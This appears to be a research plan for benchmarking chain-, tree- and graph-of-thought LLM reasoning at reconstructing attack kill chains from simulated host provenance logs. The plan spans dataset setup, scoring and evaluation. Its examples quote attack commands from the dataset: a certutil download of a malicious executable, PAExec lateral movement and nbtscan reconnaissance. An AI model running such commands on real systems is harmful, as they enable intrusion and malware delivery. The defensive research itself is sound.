# phases.md — Project Phases

The project is divided into 7 phases. Each phase has a **goal**, **concrete tasks**, and a **done-when** checkpoint. Do them in order — later phases depend on earlier ones. Do NOT start reasoning (Phase 4) before the scorer (Phase 3) is fixed, or you'll be tempted to tune output to flatter the metric.

---

## Phase 0 — Setup & data acquisition
**Goal:** environment ready, data on disk, one attack fully understood by hand.

Tasks:
- Clone the dataset: `git clone https://github.com/PKU-ASAL/Simulated-Data.git`
- **Important:** Ubuntu and W10 zips are Git LFS pointers. Run `git lfs install && git lfs pull` to get the real data (Ubuntu ~369 MB, W10 ~134 MB). WS12 (83 MB) downloads directly.
- Unzip each host (note: nested zips inside, e.g. `SimulatedWS12/hw20.zip` → `benign.json` + `anomaly.json`).
- Set up local inference: install **Ollama** (or vLLM), pull `llama3.1:8b`, `qwen2.5:7b`, `phi4`.
- Install the GoT framework: `pip install graph_of_thoughts` (repo: `spcl/graph-of-thoughts`).
- **By hand:** open `doc/SimulatedWS12-attack/attack_annotation/A1.txt`...`A6.txt` and `attack_analysis.xls`. Read the 6-step WS12 kill chain until you understand it completely. This is your reference attack.

**Done when:** you can run a "hello world" prompt against all 3 local models, and you can explain the WS12 attack's 6 stages from memory.

---

## Phase 1 — Ground-truth parser (the answer key)
**Goal:** load the ground truth into a clean Python structure, BEFORE touching the logs.

Tasks:
- Parse `attack_annotation/A*.txt` → list of `{id, occurTime, hostIp, pCommand}` per scenario. Skip `A_alltime.txt`.
- Parse `attack_analysis.xls` → map each annotation ID to its kill-chain stage. **Watch out:** combined-ID cells use the CJK comma `、` (e.g. "A1、A2、A3"), split on that character.
- Extract a **distinctive matching substring** for each attack node (the malware filename, target IP, or tool name — e.g. `sangforcat.exe`, `nbtscan`, `PAExec.exe \\192.168.0.244`). This is what scoring matches on.
- Output: a `ground_truth[scenario]` = list of `{id, stage, match_substring, full_command}`.

**Done when:** you can print, for all 5 scenarios, the ordered list of attack nodes with their stage labels and match substrings.

---

## Phase 2 — Evidence graph constructor + reduction + serializer (shared, fixed)
**Goal:** turn ~1M raw events into a small serialized candidate set that fits a context window. **This is shared by all methods and must stay fixed.**

Tasks:
- Stream `anomaly.json` line-by-line (JSONL — never load whole file into memory).
- **Construct the process graph:** for every `Process/Start` event, create a node with `{PID, ParentID, ImageFileName, CommandLine, MSec}`; link ParentID → PID edges. Attach network events (`TcpIp/*` to external IPs) and suspicious file writes to their process.
- **Reduce:** keep all `Process/Start` nodes (with command lines), external network connections, suspicious file writes. Drop the noise (`FileIO/Read`, `Image/Load`, etc.). This collapses ~1M → ~50-300 candidate events.
- **CRITICAL CHECK:** verify every ground-truth attack command (from Phase 1) survives reduction. If any is dropped, loosen the filter. Recall is capped by what survives — this check protects the whole experiment.
- **Serialize:** write the candidate graph as indented structured text that preserves causality (parent → child shown via indentation), e.g.:
  ```
  cmd.exe (PID 2428)
    └─ certutil (PID 3820): certutil -urlcache -split -f http://... /sangforcat.exe
         └─ agent.exe (PID 4102): connected to 124.223.85.207
  ```
- Keep serialization identical across methods. Format is an ablation knob later, not now.

**Done when:** for each scenario, you produce a serialized candidate set under ~8K tokens that provably contains all ground-truth attack events.

---

## Phase 3 — The scorer (fix this BEFORE reasoning)
**Goal:** a deterministic function that grades any model output against ground truth. Lock it before running any reasoning so you can't game the metric.

Tasks:
- Input: a model's structured output = `{malicious_events: [{command, stage}], ...}` + a scenario's `ground_truth`.
- **Event-level:** for each flagged event, TP if its command contains a ground-truth `match_substring`; FP if it matches nothing; FN for any ground-truth node not matched. Compute precision, recall, F1.
- **Stage-level:** fraction of ground-truth stages correctly recovered AND correctly labeled (partial credit). Report per scenario.
- **Hallucination:** fraction of IOCs (IPs, filenames) in the model's output that do NOT appear anywhere in the candidate evidence set. Automatable string check.
- Output: a metrics dict per run. Keep event-F1 (comparable to prior work) separate from stage-recall (the diagnostic) — do NOT blend into a composite.

**Done when:** you can feed a hand-written fake output and get correct precision/recall/F1 + stage-recall back. Unit-test it with a known-good and known-bad example.

---

## Phase 4 — Reasoning methods (CoT, ToT, GoT) — the only variable
**Goal:** implement the three topologies over the frozen models. Same input (Phase 2 output), same output format (Phase 3 input).

Tasks:
- Define the **output contract**: every method must emit JSON `{malicious_events: [{command, stage}], narrative: "..."}`. Force JSON so the scorer works automatically.
- **CoT:** one prompt, one call. "Here are the events. Reason step by step, identify malicious events, assign stages, output JSON."
- **ToT:** Generate (k candidate interpretations of ambiguous events) → Evaluate (score each) → KeepBest (prune) → recurse. Use the GoT framework's Graph-of-Operations to express this as a tree.
- **GoT:** split candidate set into segments (by time window or process subtree) → Generate per-segment independently → **Aggregate** (merge segment findings into one chain — the key operation) → Refine (revise given full chain) → Score → KeepBest.
- Use `spcl/graph-of-thoughts` Graph-of-Operations for all three (it can express CoT and ToT too — one codebase, clean comparison).
- **Few-shot hygiene:** if using few-shot examples, draw them from a DIFFERENT scenario than the one being tested (leave-one-scenario-out). Prevents answer leakage.
- Instrument every method to log: number of LLM calls, prompt+completion tokens, wall-clock time.

**Done when:** each of CoT/ToT/GoT produces valid parseable JSON output for WS12 on all 3 models, and you can score it.

---

## Phase 5 — Run the full evaluation grid
**Goal:** produce all results.

Tasks:
- Grid: **5 scenarios × 3 methods × 3 models × N seeds** (N = 3-5). ~135-225 runs. Inference is free on your GPU — run them all.
- For each cell: run method → get output → score → record accuracy + efficiency metrics.
- Store raw outputs (the JSON + narrative) AND metrics, keyed by (scenario, method, model, seed). You'll want the raw narratives for the case study.
- Report per-scenario mean ± std across seeds. Do NOT just report one grand average — the effect must be visible per scenario.

**Done when:** you have a complete results table (accuracy + efficiency) for every grid cell.

---

## Phase 6 — Analysis, case study, writing
**Goal:** turn results into the paper's findings.

Tasks:
- **Main result:** does GoT stage-recall > ToT > CoT? By how much? Statistically distinguishable across scenarios?
- **Efficiency:** plot accuracy vs. cost (LLM calls / tokens). Draw the Pareto frontier. Is GoT's gain worth its cost?
- **Ablation (isolate aggregation):** compare GoT-with-aggregation vs. "run more independent Generates and pick best" (no aggregation). This proves the win is aggregation, not just extra sampling. **This is the most important experiment for defending novelty.**
- **Qualitative case study:** pick one scenario, show the full kill chain each method reconstructed, highlight what GoT recovered that CoT/ToT missed. Use the raw narratives.
- Write up against the abstract/proposal already drafted. Fill the result-dependent sentence with the actual finding.

**Done when:** you have the main comparison figure, the efficiency Pareto plot, the aggregation ablation, one case study, and a complete draft.

---

## Suggested order for an implementation agent
0 → 1 → 2 → 3 → 4 → 5 → 6, strictly. The one rule that matters most: **Phase 3 (scorer) is locked before Phase 4 (reasoning) begins.** And within Phase 2, the ground-truth-survival check is a hard gate — do not proceed to reasoning until it passes.
